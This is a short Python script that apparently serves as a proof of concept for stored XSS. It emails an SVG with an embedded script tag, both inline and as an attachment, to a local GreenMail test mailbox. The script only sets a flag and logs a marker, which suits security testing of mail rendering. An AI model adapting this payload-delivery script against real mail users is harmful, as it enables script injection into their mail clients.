#!/usr/bin/env python3
"""Send a crafted SMTP email (SVG XSS) into the GreenMail test mailbox."""
import smtplib, email.message, sys

host, port = "127.0.0.1", 3026
to = "test@localhost"
subject = sys.argv[1] if len(sys.argv) > 1 else "rq-c1 svg xss"
svg = sys.argv[2] if len(sys.argv) > 2 else (
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<script>window.__rq=1;console.log("RQ-C1-XSS-EXECUTED")</script>'
    '</svg>')

msg = email.message.EmailMessage()
msg["From"] = "attacker@example.com"
msg["To"] = to
msg["Subject"] = subject
msg.set_content("plain body")
msg.add_alternative(svg, subtype="html")
# also attach as image/svg+xml
msg.add_attachment(svg.encode(), maintype="image", subtype="svg+xml", filename="poc.svg")

with smtplib.SMTP(host, port, timeout=20) as s:
    s.send_message(msg)
print("sent:", subject)
